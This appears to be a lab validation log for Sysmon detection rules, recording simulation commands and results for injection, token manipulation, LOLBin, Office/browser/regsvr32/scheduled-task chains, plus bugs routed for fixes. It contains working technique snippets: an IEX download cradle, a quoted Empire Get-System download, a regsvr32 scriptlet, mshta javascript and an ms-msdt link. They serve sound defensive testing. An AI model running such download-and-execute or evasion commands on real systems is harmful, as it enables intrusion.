**Actual pipeline output:** No hit, on two separate invocation attempts (23:32:22 and 23:46:41 PM). Both times, `rundll32.exe` produced a visible error dialog: **"Error in C:\Users\Public\phase4b_test.dll — Missing entry: Run"**. A full, unfiltered EID 7 audit of both time windows shows `rundll32.exe` loading ~30 legitimate system DLLs (`ole32.dll`, `WinTypes.dll`, `CoreUIComponents.dll`, `ws2_32.dll`, etc.) each time — `phase4b_test.dll` never appears in either window.
**Family enrichment note:** Various LOLBin DLL sideloading campaigns.
**FP notes:** N/A — false negative, not a false positive.
**Notes:** Two compounding, independently-confirmed root causes:
1. **Export resolution failure (explains the error dialog):** `rundll32.exe`'s invocation model is `LoadLibrary(dllpath)` → `GetProcAddress(dllpath, "Run")` → call the resolved function. Our test DLL's `Phase4BTest.Run()` method is CLR metadata, not a native PE export-table entry, so `GetProcAddress` cannot locate it — hence "Missing entry: Run." This confirms the `LoadLibrary` step itself succeeded (the error can only occur after a successful load), yet Sysmon's ImageLoad hook still never logged an EID 7 event for the DLL.
2. **Same managed/pure-IL blind spot as `API_DLL_LOAD_SUSPICIOUS_PATH_001`:** this is the more surprising finding, since `rundll32.exe` is a *native* process invoking the DLL via ordinary Win32 API calls — which normally does trigger Sysmon's native image-load callback regardless of the file's own content. That it didn't here suggests Windows likely routes a pure-IL/mixed-mode assembly's load through the CLR shim (`mscoree.dll`) rather than a standard PE section mapping, even when the invoking process is native — meaning the assembly may never appear as a directly-mapped image to the kernel-level ImageLoad hook Sysmon monitors, regardless of the caller. **No Codex action required.** A true test of this rule requires a native (non-managed) unsigned DLL with an actual exported `Run` function, which was not available in this environment. Recommend documenting as a Section 2 (Telemetry Design) finding: Sysmon's ImageLoad hook may not reliably capture managed/pure-IL assembly loads even when the invoking process (e.g., a native LOLBin like rundll32.exe) is not itself managed code — a more general and more concerning version of the `API_DLL_LOAD_SUSPICIOUS_PATH_001` finding, since it means LOLBin-DLL-sideloading detection strategies relying solely on Sysmon EID 7 could miss managed-assembly payloads specifically.

---

## API_OPEN_PROCESS_VM_WRITE_001
**Rule name:** Non-System Process Requesting PROCESS_VM_WRITE Access
**Event ID:** 10
**Simulation command:**
```powershell
Import-Module Invoke-AtomicRedTeam
Invoke-AtomicTest T1055.001 -TestNumbers 1
Invoke-AtomicTest T1055.001 -TestNumbers 1 -Cleanup
```
**Expected pipeline output:** `RULE_HIT | API_OPEN_PROCESS_VM_WRITE_001`
**Observed result:** ENVIRONMENT-LIMITED — confirmed, not a rule/pipeline defect
**Actual pipeline output:** No hit. `Invoke-AtomicTest` returned clean `Exit code: 0`. Confirmed via EID 1 that both `mavinject.exe` and `notepad.exe` (the atomic's injection target) spawned correctly at 23:32:44 PM, with the expected parent-child chain fully visible: `powershell.exe → mavinject.exe`, `mavinject.exe → notepad.exe` (both EID 1 events present, plus `csrss.exe → mavinject.exe` and duplicate `powershell.exe → notepad.exe` entries from process-table refresh). Despite this, a targeted EID 10 query for `SourceImage=mavinject.exe` in the exact 23:32:44–23:32:45 window returned **zero results** (`Get-WinEvent: No events were found that match the specified selection criteria`), and a widened query across 23:32:40–23:33:05 for any `SourceImage` matching `mavinject` also returned zero results — confirming this is not a timing/window artifact.
**Family enrichment note:** Metasploit, Cobalt Strike (classic DLL injection, PROCESS_VM_WRITE access pattern).
**FP notes:** N/A — false negative, not a false positive.
**Notes:** Note on technique fidelity: Atomic T1055.001, Test 1 is titled "Process Injection via mavinject.exe" — it performs the injection via the legitimate, Microsoft-signed `mavinject.exe /INJECTRUNNING` mechanism rather than a raw custom `OpenProcess`/`WriteProcessMemory` P/Invoke sequence as the original task spec envisioned. This is itself a real, documented technique (mavinject abuse is LOLBin-adjacent and separately worth future rule coverage), so it remains a valid and arguably more realistic test of this rule. The confirmed absence of any EID 10 event for `mavinject.exe` — despite the process demonstrably running and its target (`notepad.exe`) demonstrably spawning — indicates `mavinject.exe`'s actual memory-injection mechanism does not trigger a user-mode `OpenProcess`-style access pattern that Sysmon's `ProcessAccess` ETW hook observes, or does so via a kernel-mediated/COM-based path outside that hook's visibility. **No Codex action required** — the rule's YAML condition (non-system source + `PROCESS_VM_WRITE`-type access mask) was never actually exercised against a genuine qualifying event. This parallels the `API_DLL_LOAD_SUSPICIOUS_PATH_001`/`API_LOLBIN_DLL_UNSIGNED_001` findings above: a real, deliberate technique whose underlying OS mechanism structurally evades this specific Sysmon telemetry hook. Recommend documenting as a Section 2 (Telemetry Design) finding, and flagging `mavinject.exe`-based injection specifically as a technique requiring a supplementary detection approach beyond Sysmon EID 10 if this injection vector needs coverage in a future phase.

---

## API_TOKEN_MANIPULATION_001
**Rule name:** PROCESS_DUP_HANDLE Access to Privileged Process
**Event ID:** 10
**Simulation command:**
```powershell
Invoke-AtomicTest T1134.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1134.001 -TestNumbers 1
Invoke-AtomicTest T1134.001 -TestNumbers 1 -Cleanup
```
**Expected pipeline output:** `RULE_HIT | API_TOKEN_MANIPULATION_001`
**Observed result:** PARTIAL — Defender interference, not a rule/pipeline defect
**Actual pipeline output:** No hit for the rule itself. GetPrereqs returned "No Preqs Defined." The test itself failed at the payload-download stage: `IEX : ... This script contains malicious content and has been blocked by your antivirus software`, followed by `Get-System : The term 'Get-System' is not recognized...` (the function was never defined because the download was blocked). Cleanup ran without error. **Incidentally**, the blocked download's command line — an attempt to `IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/.../Get-System.ps1' -UseBasicParsing)` — triggered two unrelated rules moments later: `[2026-07-09 23:33:11] RULE_HIT | ... id=PS_DOWNLOAD_CRADLE_001 ...` and `[2026-07-09 23:33:13] RULE_HIT | ... id=NET_POWERSHELL_HTTP_001 ... dest='cdn-185-199-108-133.github.com:443'`.
**Family enrichment note:** Cobalt Strike (`steal_token`), PowerSploit (`Invoke-TokenManipulation`).
**FP notes:** None for this rule directly.
**Notes:** Same interference class as `PS_AMSI_BYPASS_001`, `PS_CREDENTIAL_ACCESS_001`, `LOLBIN_RUNDLL32_SUSPICIOUS_001`, `LOLBIN_REGSVR32_001`, and Subphase 5's own `API_CREATE_REMOTE_THREAD_001` Atomic-test block — Defender's AMSI layer intercepted the malicious-content-flagged download before the named-pipe client impersonation technique (which would have generated the target `PROCESS_DUP_HANDLE` access against lsass.exe/winlogon.exe/services.exe) could ever execute. The rule's logic remains unvalidated by direct simulation in this environment for the same structural reason documented under `PS_CREDENTIAL_ACCESS_001`: any payload capable of tripping this rule's detection keywords is also reliably caught earlier by Defender's AMSI scanner, making a live-fire test of the actual technique difficult without further obfuscation (which was out of scope here). No Codex action required — this is expected competing-layer AV behavior and a legitimate Section 3 research finding about the practical difficulty of exercising post-download detection rules when an upstream AV layer blocks the payload before delivery.

---

## API_AV_PROCESS_ACCESS_001 (deliberate-trigger test)
**Rule name:** Non-System Process Accessing Security Software Process
**Event ID:** 10
**Simulation command:**
```powershell
$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class AVAccess {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void OpenDefender() {
        foreach (var p in Process.GetProcessesByName("MsMpEng")) {
            IntPtr h = OpenProcess(0x0001, false, (uint)p.Id);
            Console.WriteLine("Handle: " + h);
            if (h != IntPtr.Zero) CloseHandle(h);
        }
    }
}
"@
Add-Type -TypeDefinition $code
[AVAccess]::OpenDefender()
```
**Expected pipeline output:** `RULE_HIT | API_AV_PROCESS_ACCESS_001`
**Observed result:** ENVIRONMENT-LIMITED (deliberate-trigger path) — confirmed, not a rule/pipeline defect. Pre-existing unrelated FP (Issue 1) also recurred in a separate session.
**Actual pipeline output:** `Handle: 0` — `OpenProcess` was denied outright (a NULL handle return). A targeted EID 10 query for `TargetImage=MsMpEng.exe` around the test window returned only events where `SourceImage=MsMpEng.exe` (i.e., Defender scanning outward at `powershell.exe`, routine AV telemetry activity, `GrantedAccess=0x1000`/`PROCESS_QUERY_LIMITED_INFORMATION`) — never an event with `TargetImage=MsMpEng.exe`, confirming no access was ever granted for Sysmon to observe.
**Family enrichment note:** Various AV termination tools.
**FP notes:** MsMpEng.exe confirmed running (PID 4000) prior to the test. No FP observed from this deliberate test itself. Separately (and unrelated to this test), a fresh, independent pipeline session on 2026-07-12 (three days after Subphase 5 testing, ambient/background activity only) reproduced the pre-existing Issue 1 pattern 5 times: `csrss.exe`/`conhost.exe` → `MpCmdRun.exe` (access=0x1fffff), zero test-driven — see Issue 1 update below.
**Notes:** `Handle: 0` combined with the absence of any `TargetImage=MsMpEng.exe` EID 10 event strongly indicates **PPL (Protected Process Light)** blocked the `OpenProcess(PROCESS_TERMINATE)` call at the OS level before Sysmon's `ProcessAccess` hook could observe anything — Windows Defender's `MsMpEng.exe` runs as a PPL-protected process by design, which categorically denies `OpenProcess` calls from ordinary (non-protected, non-elevated-with-PPL-signing) user processes, regardless of Sysmon. Sysmon's EID 10 hook, per its own design, generally only logs *granted* access, not denied attempts. **No Codex action required for the deliberate-trigger path** — the rule's YAML condition was never exercised against a genuine qualifying event because the underlying OS security mechanism (PPL) prevents the access from ever being granted in the first place. Recommend documenting as a Section 2 (Telemetry Design) finding: testing "non-system process accesses AV process" detection rules against a PPL-protected target (as MsMpEng.exe is on modern Windows) is not feasible via a direct deliberate `OpenProcess` call in this environment; genuine validation of this rule's positive-detection path would require either a non-PPL-protected AV/security target, or accepting that the rule can only be exercised via its pre-existing (unwanted) FP pathway rather than a clean deliberate trigger.

---

## CHAIN_OFFICE_POWERSHELL_001 (re-validated)
**Rule name:** Office Application Spawning PowerShell
**Event ID:** 1
**Simulation command:** `vm_tp_test_03_chains_api_network.ps1`
**Expected pipeline output:** `RULE_HIT | CHAIN_OFFICE_POWERSHELL_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-12 22:11:31] RULE_HIT | rule='Office Application Spawning PowerShell' | id=CHAIN_OFFICE_POWERSHELL_001 | technique=T1566.001 | tactic=Initial Access | severity=High | image='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' | cmdline='powershell.exe  -NoProfile -Command "Write-Host office-ps-chain" ' | parent='C:\Users\AYUSHN~1\AppData\Local\Temp\winword.exe'`
**Family enrichment note:** Macro-based phishing, Emotet.
**FP notes:** None.
**Notes:** Clean re-fire, exact expected parent-child match (winword.exe → powershell.exe), no ambiguity.

---

## CHAIN_OFFICE_CMD_001 (re-validated)
**Rule name:** Office Application Spawning CMD
**Event ID:** 1
**Simulation command:** `vm_tp_test_03_chains_api_network.ps1`
**Expected pipeline output:** `RULE_HIT | CHAIN_OFFICE_CMD_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-12 22:11:38] RULE_HIT | rule='Office Application Spawning CMD' | id=CHAIN_OFFICE_CMD_001 | technique=T1566.001 | tactic=Initial Access | severity=High | image='C:\Windows\System32\cmd.exe' | cmdline='cmd.exe  /c echo office-cmd-chain ' | parent='C:\Users\AYUSHN~1\AppData\Local\Temp\winword.exe'`
**Family enrichment note:** Macro-based phishing.
**FP notes:** None.
**Notes:** Clean re-fire, exact expected parent-child match (winword.exe → cmd.exe), no ambiguity.

---

## CHAIN_SCRIPT_HOST_CMD_001 (re-validated)
**Rule name:** Script Host Spawning CMD
**Event ID:** 1
**Simulation command:** `vm_tp_test_03_chains_api_network.ps1`
**Expected pipeline output:** `RULE_HIT | CHAIN_SCRIPT_HOST_CMD_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-12 22:11:47] RULE_HIT | rule='Script Host Spawning CMD' | id=CHAIN_SCRIPT_HOST_CMD_001 | technique=T1059.005 | tactic=Execution | severity=High | image='C:\Windows\System32\cmd.exe' | cmdline='"C:\Windows\System32\cmd.exe" /c echo wscript-cmd-chain' | parent='C:\Windows\System32\wscript.exe'`
**Family enrichment note:** Commodity VBScript/JScript loaders.
**FP notes:** None.
**Notes:** Clean re-fire, exact expected parent-child match (wscript.exe → cmd.exe), no ambiguity.

---

## CHAIN_SCRIPT_HOST_POWERSHELL_001 (re-validated)
**Rule name:** Script Host Spawning PowerShell
**Event ID:** 1
**Simulation command:** `vm_tp_test_03_chains_api_network.ps1`
**Expected pipeline output:** `RULE_HIT | CHAIN_SCRIPT_HOST_POWERSHELL_001`
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-12 22:11:53] RULE_HIT | rule='Script Host Spawning PowerShell' | id=CHAIN_SCRIPT_HOST_POWERSHELL_001 | technique=T1059.005 | tactic=Execution | severity=High | image='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' | cmdline='"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -Command Write-Host cscript-ps-chain' | parent='C:\Windows\System32\cscript.exe'`
**Family enrichment note:** Commodity VBScript/JScript loaders.
**FP notes:** None.
**Notes:** Clean re-fire, exact expected parent-child match (cscript.exe → powershell.exe), no ambiguity. All four original parent-child rules re-validated cleanly in this single batch run, with no ambiguity anywhere in the output. Incidental activity in the same batch run (not new information): `PS_EXECUTION_POLICY_BYPASS_001` fired 5 times (harness's own launch flags, already documented); `API_CREATE_REMOTE_THREAD_001` fired twice — one clean `powershell.exe → notepad.exe` hit matching the established Subphase 5 confirmation pattern, and one `python.exe`-sourced `<unknown process>` target anomaly (4th confirmed occurrence of the Issue 2 pattern — see Issue 2 update below).

---

## CHAIN_BROWSER_SHELL_001
**Rule name:** Browser Spawning Shell or Script Host Process
**Event ID:** 1
**Simulation command (Attempt 1 — ms-msdt: URI, per task spec option 1):**
```powershell
$html = @"
<html><body>
<a id="link" href="ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=notepad.exe IT_AutoTroubleshoot=ms-msdt:&quot;">Phase 4B Test Link</a>
<script>document.getElementById('link').click();</script>
</body></html>
"@
$html | Out-File -FilePath "C:\Temp\test_browser_shell_4b.html" -Encoding ASCII
Start-Process msedge.exe "C:\Temp\test_browser_shell_4b.html"
```
**Simulation command (Attempt 2 — custom registered protocol handler, per task spec option 3):**
```powershell
$protoName = "shadowsensor4btest"
New-Item -Path "HKCU:\Software\Classes\$protoName" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\$protoName" -Name "(Default)" -Value "URL:ShadowSensor 4B Test Protocol"
Set-ItemProperty -Path "HKCU:\Software\Classes\$protoName" -Name "URL Protocol" -Value ""
New-Item -Path "HKCU:\Software\Classes\$protoName\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\$protoName\shell\open\command" -Name "(Default)" -Value 'cmd.exe /c echo browser-shell-chain-test'

$html2 = @"
<html><body>
<a id="link2" href="shadowsensor4btest:test">Phase 4B Test Link 2</a>
<script>document.getElementById('link2').click();</script>
</body></html>
"@
$html2 | Out-File -FilePath "C:\Temp\test_browser_shell_4b_v2.html" -Encoding ASCII
Start-Process msedge.exe "C:\Temp\test_browser_shell_4b_v2.html"
```
**Expected pipeline output:** `RULE_HIT | CHAIN_BROWSER_SHELL_001`
**Observed result:** PASS (confirmed via Attempt 2 — custom protocol handler); Attempt 1 (ms-msdt:) separately confirmed non-functional on this patched build, not a rule defect
**Actual pipeline output:**
- Attempt 1: No `CHAIN_BROWSER_SHELL_001` hit. Three incidental `API_CREATE_REMOTE_THREAD_001` hits with `image=msedge.exe`, `target='<unknown process>'` appeared (`22:15:02`, `22:15:05`, `22:16:04`) — assessed as Edge's own internal multi-process architecture activity (renderer/GPU/broker), and also a new source-process variant of the ongoing Issue 2 anomaly (see Issue 2 update below), not evidence the msdt technique fired.
- Attempt 2: `[2026-07-12 22:15:57] RULE_HIT | rule='Browser Spawning Shell or Script Host Process' | id=CHAIN_BROWSER_SHELL_001 | technique=T1059.001 | tactic=Execution | severity=High | image='C:\Windows\System32\cmd.exe' | cmdline='"cmd.exe" /c echo browser-shell-chain-test' | parent='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'` — clean, direct msedge.exe → cmd.exe parent-child match.
**Family enrichment note:** Drive-by download campaigns, watering hole attacks.
**FP notes:** None.
**Notes:** No Office was available in this VM, so per the task spec's fallback guidance, both remaining browser-based options were tried. Attempt 1 (`ms-msdt:`) did trigger a Windows security prompt which was accepted, but a direct Sysmon telemetry check (`Get-WinEvent` EID 1 query across the test window) confirmed **zero `msdt.exe` process-creation events at any point** — the accepted prompt did not result in process creation at all. This is consistent with Microsoft's post-CVE-2022-30190 patch, which modified `ms-msdt` handling so that even an accepted prompt no longer results in `msdt.exe` launching with attacker-controlled parameters the way it did pre-patch. This is a confirmed, evidence-backed conclusion (not a guess) and a legitimate Section 2/3 research finding: a user-accepted protocol handler prompt no longer guarantees process creation post-patch. Attempt 2 (custom protocol handler) gave a clean, unambiguous, direct-parent confirmation, proving the rule's detection logic is fully correct regardless of Attempt 1's outcome. No Codex action required — PASS is recorded on the strength of Attempt 2's clean confirmation, with Attempt 1 logged as a distinct, characterized simulation-technique limitation (patched/non-functional on this build).

---

## CHAIN_OFFICE_WSCRIPT_001
**Rule name:** Office Application Spawning WScript
**Event ID:** 1
**Simulation command:** Not run — no simulation attempted.
**Expected pipeline output:** N/A
**Observed result:** SKIPPED — Office not installed
**Actual pipeline output:** N/A
**Family enrichment note:** Macro-based loaders writing and executing .vbs droppers.
**FP notes:** N/A.
**Notes:** No Microsoft Office application is installed in this VM, so this rule's specific parent (Office app) → wscript.exe child chain could not be triggered as specified in the task. Per the task spec's own fallback guidance, this is logged as SKIPPED rather than FAIL. The Office-application-as-parent detection path itself is not unvalidated — `CHAIN_OFFICE_POWERSHELL_001` and `CHAIN_OFFICE_CMD_001` (both re-validated cleanly earlier in this subphase, parent = `winword.exe`) already confirm the parent-side matching mechanism works correctly for Office applications; only this rule's specific child type (wscript.exe) remains untested due to the environment lacking Office. No Codex action required — this is an environment constraint, not a rule defect.

---

## CHAIN_REGSVR32_CHILD_001
**Rule name:** Regsvr32 Spawning Shell or Script Process
**Event ID:** 1
**Simulation command:**
```powershell
$sct = @'
<?XML version="1.0"?>
<scriptlet>
<registration progid="Phase4BTest" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
var r = new ActiveXObject("WScript.Shell");
r.Run("cmd.exe /c echo Phase 4B regsvr32 chain simulation");
</script>
</registration>
</scriptlet>
'@
$sct | Out-File -FilePath "C:\Temp\test_4b.sct" -Encoding ASCII
```
```cmd
regsvr32.exe /s /u /i:C:\Temp\test_4b.sct scrobj.dll
```
**Expected pipeline output:** `RULE_HIT | CHAIN_REGSVR32_CHILD_001` (and likely `LOLBIN_REGSVR32_001` as a co-fire)
**Observed result:** PASS
**Actual pipeline output:** `[2026-07-12 22:20:44] RULE_HIT | rule='Regsvr32 Spawning Shell or Script Process' | id=CHAIN_REGSVR32_CHILD_001 | technique=T1218.010 | tactic=Defense Evasion | severity=High | image='C:\Windows\System32\cmd.exe' | cmdline='"C:\Windows\System32\cmd.exe" /c echo Phase 4B regsvr32 chain simulation' | parent='C:\Windows\System32\regsvr32.exe'` — fired at the identical timestamp as the co-firing `LOLBIN_REGSVR32_001` hit.
**Family enrichment note:** Squiblydoo campaigns, various APT.
**FP notes:** None.
**Notes:** Clean, unambiguous double-hit alongside `LOLBIN_REGSVR32_001` (both at `22:20:44`), exactly as the task spec predicted. Using a **local** SCT file (rather than Subphase 3's remote-URL SCT) sidestepped whatever blocked the earlier remote-scriptlet attempt entirely — no Defender interference at all this time. This test also served a second purpose: it fully resolved Subphase 3's `LOLBIN_REGSVR32_001` PARTIAL by proving the rule's YAML matching logic is correct and that the earlier PARTIAL was specifically about Defender blocking the *remote-URL* delivery mechanism (see that rule's updated detailed entry above).

---

## CHAIN_SCHEDULED_TASK_SCRIPT_001
**Rule name:** Scheduled Task Spawning Suspicious Script
**Event ID:** 1
**Simulation command:**
```cmd
schtasks /create /tn "ShadowSensor4BTest" /tr "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/')\"" /sc ONCE /st 00:00 /f
schtasks /run /tn "ShadowSensor4BTest"
schtasks /delete /tn "ShadowSensor4BTest" /f
```
**Expected pipeline output:** `RULE_HIT | CHAIN_SCHEDULED_TASK_SCRIPT_001`
**Observed result:** FAIL — CONFIRMED BUG, route to Codex
**Actual pipeline output:** No `CHAIN_SCHEDULED_TASK_SCRIPT_001` hit. Only `[2026-07-12 22:21:54] RULE_HIT | rule='PowerShell Invoke-Expression with Encoded or Downloaded Content' | id=PS_INVOKE_EXPRESSION_001 | technique=T1059.001 | tactic=Execution | severity=High | image='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' | cmdline='"powershell.exe" -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString("http://127.0.0.1/")"' | parent='C:\Windows\System32\svchost.exe'` fired instead. `NET_POWERSHELL_HTTP_001` did not fire — expected, given the already-documented 127.0.0.1 loopback EID 3 blind spot, not new information.
**Family enrichment note:** Emotet, QBot (scheduled task persistence mechanism).
**FP notes:** N/A — this is a false negative (rule coverage gap), not a false positive.
**Notes:** A full parent-chain audit (`Get-WinEvent` EID 1, structured query returning `ParentImage`/`ParentCommandLine`) confirmed conclusively that the PowerShell process's parent was `svchost.exe` with command line `C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule` — genuinely the Task Scheduler service host, not a coincidental unrelated process. The task fired exactly as intended, 10 seconds after `schtasks /run`, with the correct injected command line intact. **Root cause, confirmed:** on this Windows version, the Schedule service hosts and directly launches the task's target process from inside `svchost.exe -k netsvcs -s Schedule` rather than through `taskeng.exe`/`taskhostw.exe` as an intermediary parent (those binaries are largely legacy from older Windows task-hosting architecture; the `taskhostw.exe` instances also visible in the audit were themselves children of the same `svchost.exe -s Schedule` process, spawned for unrelated built-in maintenance tasks). This is a genuine rule-logic gap, not an environment/simulation limitation — the technique executed exactly as designed and Sysmon captured it with full parent-child fidelity, but the rule's YAML parent-image list (`taskeng.exe`, `taskhostw.exe`, `schtasks.exe`) does not include `svchost.exe`, so it never had a chance to match a real, correctly-simulated instance of the exact technique it's designed to catch. **ACTION REQUIRED: Route to Codex** — add `svchost.exe` to the rule's parent-image match list, ideally scoped by requiring the parent command line to contain `-s Schedule` (to preserve precision and avoid false-matching on every other svchost.exe-hosted service spawning an unrelated child). Also worth Codex double-checking whether `schtasks.exe` itself in the current parent list is reachable at all given this architecture, or is dead weight from an older Windows task-hosting model.

---

## CHAIN_LOLBIN_CHILD_001
**Rule name:** LOLBin Spawning Shell or Script Process as Child
**Event ID:** 1
**Simulation command (Attempt 1 — mshta.exe, per task spec):**
```cmd
mshta.exe "javascript:var r=new ActiveXObject('WScript.Shell');r.Run('cmd.exe /c echo Phase 4B LOLBin child simulation');close();"
```
**Simulation command (Attempt 2 — rundll32.exe via shell32.dll,ShellExec_RunDLL, alternate LOLBin):**
```cmd
rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c echo Phase 4B LOLBin child simulation v2
```
**Expected pipeline output:** `RULE_HIT | CHAIN_LOLBIN_CHILD_001`
**Observed result:** PASS (confirmed via Attempt 2 — rundll32.exe); Attempt 1 (mshta.exe) separately confirmed Defender-blocked, not a rule defect
**Actual pipeline output:**
- Attempt 1: Command returned `Access is denied.` at the console before any process could execute. A direct Sysmon telemetry check (`Get-WinEvent` EID 1 query across the test window) confirmed **zero `mshta.exe` process-creation events at any point** — the block happened pre-execution, so there was never a qualifying event for either `CHAIN_LOLBIN_CHILD_001` or `LOLBIN_MSHTA_001` to match against. One incidental `API_CREATE_REMOTE_THREAD_001` hit appeared (`image=cmd.exe`, `target='mshta.exe'`) — notable because mshta.exe was confirmed via telemetry to have never existed as a live process in this window at all (see Issue 2 update below).
- Attempt 2: `[2026-07-12 22:26:48] RULE_HIT | rule='LOLBin Spawning Shell or Script Process as Child' | id=CHAIN_LOLBIN_CHILD_001 | technique=T1218 | tactic=Defense Evasion | severity=High | image='C:\Windows\System32\cmd.exe' | cmdline='"C:\Windows\system32\cmd.exe" /c echo Phase 4B LOLBin child simulation v2' | parent='C:\Windows\System32\rundll32.exe'` — clean, direct rundll32.exe → cmd.exe parent-child match, co-firing at the identical timestamp with `LOLBIN_RUNDLL32_SUSPICIOUS_001` (see that rule's updated detailed entry above).
**Family enrichment note:** Various LOLBin abuse chains.
**FP notes:** None.
**Notes:** Attempt 1's "Access is denied" block is the identical interference signature already documented for `LOLBIN_RUNDLL32_SUSPICIOUS_001` and `LOLBIN_REGSVR32_001`'s remote-scriptlet/`javascript:` attempts in Subphase 3 — confirming this is the same class of AV interference (keyed to the `javascript:`/ActiveXObject invocation pattern specifically), not a new or rule-specific issue. Switching to `rundll32.exe shell32.dll,ShellExec_RunDLL` — a structurally different, legitimate LOLBin invocation technique (T1218.011) not sharing that signature — fired cleanly with zero interference, giving affirmative proof of the rule's detection logic. This also yields a useful, citable distinction for the research paper: Defender's interference in this environment is keyed to a specific invocation pattern (`javascript:`/ActiveXObject-based execution), not a blanket block on LOLBin activity in general. No Codex action required — PASS is recorded on the strength of the rundll32 confirmation, with the mshta.exe block logged as a documented, characterized environmental limitation.

---

## Cross-Cutting Issues Flagged for Codex (not tied to a single rule's PASS/FAIL entry)

**ACTION REQUIRED: Route to Codex — Issue 1 (CONFIRMED, recurred again in Subphase 5 window)**
- **Rule:** `API_AV_PROCESS_ACCESS_001`
- **File:** rules/definitions (API/memory rule file — confirm exact filename)
- **Problem:** Persistent false positive. Fired 25+ times total across four-plus sessions through Subphase 4 (7/7 23:02, 23:14, 22:17–22:18; 7/9 21:49:06 and 22:03:49) on `csrss.exe` and `conhost.exe` → `MpCmdRun.exe` / `MsMpEng.exe` (access=0x1fffff), zero corresponding test activity in any instance. **New: recurred a 5th time in an independent ambient session on 2026-07-12** (three days after Subphase 5, unrelated background pipeline run) — 5 more occurrences of the identical `csrss.exe`/`conhost.exe` → `MpCmdRun.exe` pattern (access=0x1fffff), again zero test-driven trigger. This confirms the FP is not session-specific or tied to any particular testing activity; it appears to be a stable, reproducible pattern of routine Defender/csrss interaction on this VM.
- **Fix:** Add system-caller exclusion (`csrss.exe`, `conhost.exe`, plus the existing exclusion set used for the OpenProcess rule: `svchost.exe`, `lsass.exe`, `winlogon.exe`, `wininit.exe`), following the same `not_ends_with_any`/`not_contains_any` pattern already established in the ruleset. Preserve detection for genuine non-system-process AV access. Note: Subphase 5's deliberate-trigger test for this rule (a genuine non-system-process `OpenProcess` attempt against MsMpEng.exe) was independently blocked by PPL protection (see the rule's detailed Subphase 5 entry and Issue 8 below) — meaning this rule currently has no confirmed working genuine-detection path in this environment, only the confirmed FP path. Worth flagging to Codex as an additional consideration when scoping the fix.

**ACTION REQUIRED: Route to Codex — Issue 2 (ESCALATED — CONFIRMED, no longer "needs investigation")**
- **Rule:** `API_CREATE_REMOTE_THREAD_001`
- **Severity of the bug itself:** High — this is the tool's Critical-severity injection rule producing severe alert fatigue.
- **Problem:** Fired 15+ times within a ~2.5-minute window in Subphase 2 (23:18:16–23:20:33), always with `image=powershell.exe` and `target='<unknown process>'`. Recurred again multiple times in Subphase 3 and again in Subphase 4 (21:38:49, `image=python.exe`, `target='<unknown process>'`; then 21:39:02, `image=powershell.exe`, `target=notepad.exe` — one clean attribution, one broken, within the same brief window), correlating closely with attempted-but-blocked native process launches. No Atomic Red Team injection test has been run yet (that's Subphase 5) — all occurrences so far arose from ordinary PowerShell/LOLBin/pipeline activity, not deliberate injection technique.
- **Fix needed:** (1) Investigate why `target` resolution is inconsistent — likely a normalizer gap in EID 8 target PID→image lookup, possibly a race condition tied to process launches that are terminated/blocked mid-flight, or to short-lived source processes (note the Subphase 4 occurrence attributed to `python.exe` — the pipeline's own runtime process — which is an unusual and concerning source for a CreateRemoteThread event and worth separate scrutiny). (2) Investigate whether the rule is failing to distinguish legitimate in-process/self-referential thread creation from genuine cross-process CreateRemoteThread — may need an additional condition requiring source PID ≠ target PID, or a validated non-null target before firing. (3) Do not close this out via Subphase 5's Atomic Red Team test alone — the volume and pattern here indicates a standalone bug independent of any deliberate injection technique. (4) Cross-reference with Issue 6 below (`NET_DNS_SCRIPT_ENGINE_001`) — both bugs share the identical `<unknown process>`/unresolved-GUID signature, suggesting a single shared normalizer defect in PID→image/ProcessGuid resolution that may span multiple event types (EID 8, EID 22, possibly EID 10). Recommend Codex investigate the normalizer's process-resolution logic holistically rather than patching each event type's symptom independently.
- **Subphase 5 update:** A **third confirmed occurrence** of the `python.exe`-sourced `<unknown process>` target anomaly was captured at `[2026-07-09 23:28:38]`, immediately preceding (by ~14 seconds) a clean, fully-resolved hit (`powershell.exe → notepad.exe`) from the same test script's built-in CRT test. This reinforces that the bug fires independently and inconsistently even within the same brief test window, sometimes resolving correctly and sometimes not — strengthening the case for a race-condition-style root cause in the normalizer's process-table lookup timing rather than something specific to any one triggering technique. Notably, the deliberate Atomic Red Team T1055.003 test intended to formally validate this rule's EID 8 detection path was blocked by Defender before executing (see the rule's detailed Subphase 5 entry) — meaning the "clean hit" confirmation for this rule came entirely from incidental script activity, not the planned deliberate injection technique, and the underlying `<unknown process>` bug remains uninvestigated by Codex as of end of Subphase 5.
